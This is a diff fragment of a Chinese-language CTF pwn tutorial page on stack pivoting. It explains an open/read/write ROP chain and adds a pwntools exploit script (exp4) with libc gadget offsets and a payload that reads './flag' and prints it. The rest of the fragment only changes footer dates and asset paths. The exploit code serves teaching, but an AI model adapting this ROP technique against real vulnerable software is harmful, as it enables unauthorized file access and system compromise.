+<p>最后构造栈迁移 + orw ROP链，和第二步类似但我们需要构造的栈内容如下：</p>
+<p><img alt="stack_pivoting-stack4" src="../assets/stack_pivoting-stack4.png" /></p>
+<ol>
+<li>构造open("./flag",0,0) 读取 flag 内容</li>
+<li>构造read(3,0xFF,address) 将 flag 内容放入可写可读地址，我们这里直接选择 payload 的起始地址，3指的是 flag 的文件描述符</li>
+<li>构造write(1,0xFF,address) 将指定地址的内容输出到标准输出流</li>
+<li>rbp 栈迁移到 payload 开头</li>
+</ol>
+<p>exp4：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x937</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x21112</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x202f8</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">pop_rdx</span> <span class="o">=</span> <span class="mh">0x1b92</span>  <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x3a738</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x26bf</span>  <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x288</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">mov_rdi_rax</span> <span class="o">=</span> <span class="mh">0x400A8D</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="n">open_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="n">read_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="n">write_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="n">payload4</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;./flag</span><span class="se">\x00\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">old_rbp</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">open_address</span><span class="p">)</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="n">payload4</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">old_rbp</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_address</span><span class="p">)</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="n">payload4</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">old_rbp</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_address</span><span class="p">)</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="n">payload4</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x90</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">old_rbp</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload4</span><span class="p">)</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年5月1日 10:40:40</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年4月29日 18:42:36</span>
       
         <br>
         创建日期:
-        <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年5月1日 10:40:40</span>
+        <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年4月29日 18:42:36</span>
       
     
   </small>
@@ -1500,17 +1713,17 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate", "navigation.tracking", "navigation.tabs", "navigation.indexes", "navigation.top", "header.autohide"], "search": "../../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "navigation.tracking", "navigation.tabs", "navigation.indexes", "navigation.top", "header.autohide"], "search": "../../../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.220ee61c.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.220ee61c.min.js"></script>
       
         
           <script src="https://gcore.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"></script>
         
       
         
-          <script src="../../js/katex.js"></script>
+          <script src="../../../js/katex.js"></script>
         
       
     
